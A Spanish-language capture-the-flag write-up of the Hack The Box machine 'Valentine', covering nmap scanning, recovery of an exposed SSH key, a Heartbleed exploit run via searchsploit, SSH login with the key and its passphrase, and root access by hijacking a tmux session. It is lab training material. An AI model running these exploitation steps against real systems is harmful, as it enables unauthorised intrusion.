# 🕵️ Reconocimiento

Enviamos un `ping` para verificar si la máquina está activa y estimar el sistema operativo por TTL:

```bash
ping -c 1 10.10.10.79
```

![[Valentine1.png]]

- **TTL = 63** → Cercano a 64, se asume que es **Linux**.

---

## 🔍 Escaneo de puertos con Nmap

1. Escaneo completo de puertos abiertos:
   ```bash
   nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.79 -oG allports
   ```
   ![[Valentine2.png]]

2. Escaneo detallado con detección de versión y scripts básicos:
   ```bash
   nmap -sCV -p22,80,443 10.10.10.79 -oN target
   ```
   ![[Valentine3.png]]

- Puertos abiertos:
  - **22:** SSH
  - **80:** HTTP
  - **443:** HTTPS

---

## 🌐 Enumeración web

### HTTP
http://10.10.10.79

![[Valentine4.png]]

### HTTPS

https://10.10.10.79

![[Valentine5.png]]

- Nmap sugiere posibles directorios `/dev/` y `/index/`:
  ![[Valentine6.png]]

### Directorio `/dev/`
http://10.10.10.79/dev

![[Valentine7.png]]
http://10.10.10.79/dev/hype_key
- Encontramos `hype_key`:
  ```bash
  xxd -r -p key.txt > id_rsa && chmod 600 id_rsa
  ```
  ![[Valentine8.png]]
  ![[Valentine9.png]]

---

## ❤️‍🔥 Heartbleed

1. Verificar vulnerabilidad:
   ```bash
   nmap --script ssl-heartbleed -p80,443,22 10.10.10.79
   ```
   ![[Valentine10.png]]
2. Exploit con Searchsploit:
   ```bash
   searchsploit -m multiple/remote/32764.py
   python2.7 32764.py 10.10.10.79 -p 443
   ```
   ![[Valentine11.png]]
3. Decodificar cadena Base64:
   ```bash
   echo "BASE64_STRING" | base64 -d > id_rsa
   chmod 600 id_rsa
   ```
   ![[Valentine12.png]]
   ![[Valentine13.png]]

---

## 🔐 Acceso SSH

```bash
ssh -o PubkeyAcceptedKeyTypes=+ssh-rsa \
    -o HostKeyAlgorithms=+ssh-rsa \
    -i id_rsa hype@10.10.10.79
```
- **Passphrase:** `heartbleedbelievethehype`

![[Valentine14.png]]

---

## 🪟 Tratamiento de la TTY

```bash
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset xterm
export SHELL=bash
export TERM=xterm
stty rows 37 columns 174
```

---

## 🧗‍♂️ Escalada de privilegios

1. Listar procesos tmux:
   ```bash
   ps aux | grep tmux
   ```
   ![[Valentine15.png]]
2. Hijack de sesión tmux:
   ```bash
   sudo /usr/bin/tmux -S /.devs/dev_sess
   ```
   ![[Valentine16.png]]

---

# 🧠 Notas

- **CTRL+ALT** en Kitty permite copiar líneas directamente.

---

# 📚 Créditos

- Writeup oficial de HTB  
- [Writeup de adrijmnz](https://github.com/adrijmnz/WriteUps/blob/main/HackTheBox/Easy/Valentine/Valentine.md)
